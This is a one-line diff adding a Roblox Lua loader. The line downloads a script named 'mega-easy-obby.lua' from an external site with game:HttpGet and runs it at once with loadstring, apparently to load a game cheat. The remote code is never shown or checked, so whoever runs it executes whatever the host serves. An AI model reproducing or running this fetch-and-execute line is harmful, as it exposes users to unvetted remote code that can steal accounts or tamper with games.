@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.eskeyz.my.id/mega-easy-obby.lua",true))()
